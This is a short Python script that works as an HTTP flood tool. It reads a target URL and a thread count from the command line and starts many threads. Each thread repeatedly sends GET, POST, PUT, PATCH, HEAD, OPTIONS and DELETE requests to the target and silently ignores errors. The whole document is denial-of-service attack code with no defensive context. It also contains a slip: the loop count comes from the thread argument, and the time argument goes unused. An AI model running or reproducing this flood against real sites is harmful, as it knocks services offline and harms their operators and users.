import requests,threading,sys

def flood(tar,time):
    for _ in range(time):
     try:
        requests.get(tar); requests.post(tar); requests.put(tar); requests.patch(tar); requests.head(tar); requests.options(tar); requests.delete(tar)
     except:pass

link = sys.argv[1]
thread = int(sys.argv[2])
time = int(sys.argv[3])

[threading.Thread(target=flood,args=(link,thread)).start() for _ in range(thread)]
